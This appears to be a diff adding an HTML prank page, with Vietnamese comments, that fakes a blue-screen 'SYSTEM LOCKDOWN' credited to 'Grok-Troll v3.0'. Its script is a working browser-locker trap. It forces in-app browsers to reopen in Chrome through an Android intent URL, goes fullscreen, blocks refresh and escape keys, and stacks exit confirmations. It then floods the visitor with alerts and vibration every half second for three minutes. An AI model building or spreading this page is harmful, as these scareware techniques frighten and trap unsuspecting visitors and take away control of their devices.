@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Error</title>
+    <style>
+        body {
+            background-color: #0000FF;
+            color: white;
+            font-family: 'Courier New', Courier, monospace;
+            margin: 0;
+            padding: 20px;
+            overflow: hidden;
+        }
+        .error {
+            font-size: 20px;
+            line-height: 1.5;
+        }
+        .blink {
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.1);
+            z-index: 9999;
+        }
+    </style>
+</head>
+<body onload="checkBrowserAndStart()">
+    <div id="overlay"></div>
+    <div class="error">
+        <h1>*** SYSTEM LOCKDOWN DETECTED ***</h1>
+        <p>Fatal exception 0E at 0028:TROLL1337.</p>
+        <p>Compromised by "Grok-Troll v3.0"</p>
+        <p class="blink">Escape disabled for 3 minutes...</p>
+        <p>Memory dump: 0xDEADBEEF 0xCAFEBABE 0xLOCKED</p>
+    </div>
+
+    <script>
+        // Danh sách thông báo troll
+        const messages = [
+            "Escape attempt failed! You’re trapped!",
+            "System locked for 180 seconds... good luck!",
+            "Clicking won’t save you now!",
+            "Grok says: No exit for 3 minutes!",
+            "Error: Escape function disabled!"
+        ];
+
+        // Chặn thoát bằng vòng lặp xác nhận phức tạp
+        window.onbeforeunload = function() {
+            let attempts = 0;
+            while (attempts < 3) { // Yêu cầu xác nhận 3 lần
+                if (!confirm("Are you sure you want to escape the troll?")) {
+                    return "You can’t leave yet!";
+                }
+                attempts++;
+            }
+        };
+
+        // Chặn phím tắt
+        document.onkeydown = function(e) {
+            if (e.key === "F5" || (e.ctrlKey && e.key === "r") || e.key === "Escape" || e.key === "Backspace") {
+                e.preventDefault();
+                alert("All exits blocked during lockdown!");
+            }
+        };
+
+        // Vào chế độ toàn màn hình
+        function goFullScreen() {
+            const elem = document.documentElement;
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen();
+            } else if (elem.webkitRequestFullscreen) {
+                elem.webkitRequestFullscreen();
+            } else if (elem.msRequestFullscreen) {
+                elem.msRequestFullscreen();
+            }
+        }
+
+        // Kiểm tra và ép mở trình duyệt chính
+        function checkBrowserAndStart() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            const isMiniBrowser = /webview|wv|messenger|instagram|line|zalo/i.test(userAgent);
+
+            if (isMiniBrowser) {
+                const currentUrl = window.location.href;
+                if (currentUrl.startsWith("http")) {
+                    // Ép mở trình duyệt mặc định trên Android
+                    window.location.href = "intent://" + currentUrl.replace("http://", "").replace("https://", "") + "#Intent;scheme=https;package=com.android.chrome;end";
+                    // Dự phòng cho iOS hoặc thất bại
+                    setTimeout(() => {
+                        window.location.href = "https://" + currentUrl.replace("http://", "").replace("https://", "");
+                    }, 500);
+                } else {
+                    alert("Please open this link in a browser like Chrome or Safari for the full experience!");
+                }
+            } else {
+                startTroll();
+            }
+        }
+
+        function startTroll() {
+            goFullScreen();
+            let i = 0;
+            const lockdownTime = 180000; // 3 phút
+
+            // Tăng tần suất thông báo để khó thoát
+            const trollInterval = setInterval(() => {
+                alert(messages[i % messages.length]);
+                i++;
+                if ("vibrate" in navigator) {
+                    navigator.vibrate([200, 100, 200]);
+                }
+            }, 500); // Giảm xuống 0.5 giây
+
+            // Mở khóa sau 3 phút
+            setTimeout(() => {
+                clearInterval(trollInterval);
+                window.onbeforeunload = null;
+                if (document.exitFullscreen) {
+                    document.exitFullscreen();
+                } else if (document.webkitExitFullscreen) {
+                    document.webkitExitFullscreen();
+                }
+                alert("Lockdown ended! You survived! Close this tab now.");
+            }, lockdownTime);
+        }
+    </script>
+</body>
+</html>
